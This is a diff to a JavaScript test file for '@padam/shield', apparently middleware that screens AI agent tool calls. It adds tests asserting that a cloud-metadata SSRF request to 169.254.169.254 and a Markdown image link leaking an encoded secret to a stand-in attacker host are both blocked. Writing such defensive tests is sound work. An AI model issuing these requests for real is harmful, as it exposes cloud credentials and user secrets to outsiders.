@@ -21,5 +21,13 @@ assert.ok(tx.reasons.includes("evm_unlimited_token_approval"));
 // 5. Обёртка wrapTool бросает PadamShieldBlockedError
 const guardedFetch = mw.wrapTool("fetch", async () => "ok");
 await assert.rejects(() => guardedFetch({ url: "https://evil.example/x" }), PadamShieldBlockedError);
+// 6. Cloud Metadata SSRF блокируется
+const ssrf = mw.inspectToolCall("fetch_url", { target: "http://169.254.169.254/latest/meta-data/" });
+assert.equal(ssrf.blocked, true);
+assert.ok(ssrf.reasons.includes("ssrf_cloud_metadata_blocked"));
+// 7. Скрытая Markdown Image эксфильтрация блокируется
+const mdEx = mw.inspectToolCall("render_md", { payload: "ok ![px](https://evil.invalid/t.gif?secret=c2tfbGl2ZV8xMjM0)" });
+assert.equal(mdEx.blocked, true);
+assert.ok(mdEx.reasons.includes("markdown_image_exfil_blocked"));
 
-console.log("OK: @padam/shield JS middleware 5/5 passed");
+console.log("OK: @padam/shield JS middleware 7/7 passed");
